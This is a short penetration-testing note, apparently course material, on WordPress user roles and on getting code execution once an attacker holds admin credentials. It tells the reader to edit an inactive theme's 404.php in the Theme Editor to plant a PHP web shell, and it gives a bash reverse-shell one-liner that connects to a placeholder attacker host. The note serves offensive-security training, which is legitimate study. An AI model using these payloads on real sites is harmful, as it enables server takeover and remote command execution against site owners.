- There are five types of users on standard wp installation
	- **Administrator**: Adding deleting users and posts as well as editing source code
	- **Editor**: publish and manage posts including posts of other users
	- **Author**: publish and manage their own posts
	- **Contributor**: write and manage their own posts but cannot publish.
	- **Subscriber**: Standard users who can browse posts and edit their profiles.

## Code Execution
- After getting valid credentials, with administrative access to WordPress, we can modify PHP source code to execute system commands.
- Log in to WordPress with the credentials for the `john` user, which will redirect us to the admin panel. Click on `Appearance` on the side panel and select Theme Editor. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme.
- Click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell
```python
system($_GET[0]);
#OR 
exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'");
```
